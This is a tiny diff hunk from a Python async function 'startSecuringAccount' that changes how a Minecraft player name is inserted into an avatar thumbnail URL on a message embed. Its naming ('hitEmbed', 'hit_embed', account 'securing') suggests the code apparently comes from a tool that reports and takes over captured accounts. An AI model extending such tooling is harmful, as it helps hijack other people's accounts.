@@ -63,7 +63,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     
     if account["method"] != "No Minecraft":
         mcEmbed = Embed()        
-        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{account['name']}/128")
+        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{str(account['name'])}/128")
 
     accountData = {
         "hit_embed": hitEmbed,
